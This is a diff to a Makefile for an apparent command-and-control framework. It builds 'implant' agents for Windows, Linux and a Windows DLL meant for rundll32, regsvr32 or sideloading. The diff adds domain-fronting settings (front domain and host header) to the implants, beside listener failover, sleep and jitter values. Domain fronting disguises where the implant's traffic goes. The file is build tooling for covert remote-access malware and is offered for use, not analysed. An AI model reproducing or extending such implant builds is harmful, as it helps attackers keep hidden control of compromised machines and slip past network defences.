@@ -9,6 +9,8 @@ LDFLAGS     := -s -w -X '$(MODULE)/internal/implant.Version=$(VERSION)'
 LISTENER_URL ?= https://127.0.0.1:443 # comma-separated for failover, e.g.: https://primary:443,https://backup:443
 SLEEP        ?= 10
 JITTER       ?= 20
+FRONT_DOMAIN ?=
+HOST_HEADER  ?=
 SERVER_PUBKEY := $(shell openssl rsa -pubin -in configs/server.pub -outform DER 2>/dev/null | base64 -w0)
 
 # ──────────────── Server ────────────────
@@ -31,7 +33,9 @@ agent-windows: ## Cross-compile Windows/amd64 agent
 	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
 	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
 	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)' \
-	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)'" \
+	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)' \
+	  -X '$(MODULE)/internal/implant.FrontDomain=$(FRONT_DOMAIN)' \
+	  -X '$(MODULE)/internal/implant.HostHeader=$(HOST_HEADER)'" \
 	  -o $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.exe ./cmd/agent
 	@echo "[+] Agent built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.exe"
 
@@ -44,7 +48,9 @@ agent-linux: ## Cross-compile Linux/amd64 agent
 	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
 	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
 	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)' \
-	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)'" \
+	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)' \
+	  -X '$(MODULE)/internal/implant.FrontDomain=$(FRONT_DOMAIN)' \
+	  -X '$(MODULE)/internal/implant.HostHeader=$(HOST_HEADER)'" \
 	  -o $(AGENT_DIR)/$(AGENT_BIN)_linux_amd64 ./cmd/agent
 	@echo "[+] Agent built: $(AGENT_DIR)/$(AGENT_BIN)_linux_amd64"
 
@@ -71,7 +77,9 @@ agent-dll: ## Cross-compile Windows DLL agent (rundll32/regsvr32/sideload)
 	  -X '$(MODULE)/internal/implant.ListenerURL=$(LISTENER_URL)' \
 	  -X '$(MODULE)/internal/implant.SleepSeconds=$(SLEEP)' \
 	  -X '$(MODULE)/internal/implant.JitterPercent=$(JITTER)' \
-	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)'" \
+	  -X '$(MODULE)/internal/implant.ServerPubKey=$(SERVER_PUBKEY)' \
+	  -X '$(MODULE)/internal/implant.FrontDomain=$(FRONT_DOMAIN)' \
+	  -X '$(MODULE)/internal/implant.HostHeader=$(HOST_HEADER)'" \
 	  -o $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.dll ./cmd/agent-dll
 	@echo "[+] DLL built: $(AGENT_DIR)/$(AGENT_BIN)_windows_amd64.dll"
 
